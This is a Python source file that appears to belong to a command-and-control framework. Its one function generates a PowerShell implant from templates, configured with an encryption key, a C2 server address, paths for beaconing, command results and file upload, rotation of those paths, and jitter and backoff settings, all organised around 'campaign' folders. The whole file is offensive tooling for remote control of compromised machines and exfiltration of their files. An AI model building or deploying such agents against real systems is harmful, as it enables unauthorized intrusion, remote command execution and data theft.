import os
import base64
import json
import time
import importlib.util
from pathlib import Path

def generate_agent_code(key_base64, server_address, beacon_path="/beacon", cmd_result_path="/command_result", file_upload_path="/file_upload", rotation_info=None):
    """Generate PowerShell agent code with identity collection and dynamic path rotation"""
    
    # Ensure all paths have leading slashes
    if not beacon_path.startswith('/'):
        beacon_path = '/' + beacon_path
    if not cmd_result_path.startswith('/'):
        cmd_result_path = '/' + cmd_result_path
    if not file_upload_path.startswith('/'):
        file_upload_path = '/' + file_upload_path
    
    # Get powershell agent module path
    powershell_module_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "helpers", "powershell", "agent.py")
    
    if not os.path.exists(powershell_module_path):
        raise FileNotFoundError(f"PowerShell agent module not found at {powershell_module_path}")
    
    # Import the module dynamically
    spec = importlib.util.spec_from_file_location("powershell_agent", powershell_module_path)
    powershell_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(powershell_module)
    
    # Extract host and port from server_address
    if ":" in server_address:
        host, port = server_address.split(':')
    else:
        host = server_address
        port = "80"  # Default port if not specified
    
    # Set up parameters for the template system
    rotation_enabled = rotation_info is not None
    rotation_id = rotation_info.get('current_rotation_id', 0) if rotation_info else 0
    next_rotation_time = rotation_info.get('next_rotation_time', int(time.time()) + 3600) if rotation_info else int(time.time()) + 3600
    rotation_interval = rotation_info.get('rotation_interval', 3600) if rotation_info else 3600
    
    # Determine campaign folder - required by the template system
    current_dir = os.path.dirname(os.path.abspath(__file__))
    campaign_folder = os.path.dirname(current_dir)
    
    if not campaign_folder.endswith("_campaign"):
        # Look for campaign folders in the current directory
        os.chdir(os.path.dirname(current_dir))  # Move up one level
        dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
        if dirs:
            campaign_folder = dirs[0]
        else:
            # Create a temporary campaign folder
            campaign_folder = "temp_campaign"
            os.makedirs(campaign_folder, exist_ok=True)
    
    # Generate the agent using the template system
    agent_code, _ = powershell_module.generate_from_templates(
        key_base64=key_base64,
        server_address=server_address,
        beacon_path=beacon_path,
        cmd_result_path=cmd_result_path,
        file_upload_path=file_upload_path,
        rotation_enabled=rotation_enabled,
        rotation_id=rotation_id,
        next_rotation_time=next_rotation_time,
        rotation_interval=rotation_interval,
        beacon_interval=5,  # Default
        jitter_percentage=20,  # Default
        max_failures=3,  # Default
        max_backoff=300,  # Default
        use_ssl=False,  # Not needed for agent code generation
        http_protocol="http",  # Not needed for agent code generation
        stager_path="/b64_stager"  # Not needed for agent code generation
    )
    
    return agent_code